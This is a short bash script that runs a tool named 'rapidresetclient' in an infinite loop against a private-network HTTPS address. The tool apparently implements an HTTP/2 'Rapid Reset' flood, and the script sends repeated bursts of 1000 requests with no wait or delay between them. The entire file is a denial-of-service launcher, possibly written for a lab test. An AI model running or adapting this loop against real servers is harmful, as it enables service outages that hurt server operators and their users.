#!/bin/bash
while true ; do ./rapidresetclient -requests 1000 -url https://192.168.0.108:443 -wait=0 -delay=0 -concurrency=1 ; done 
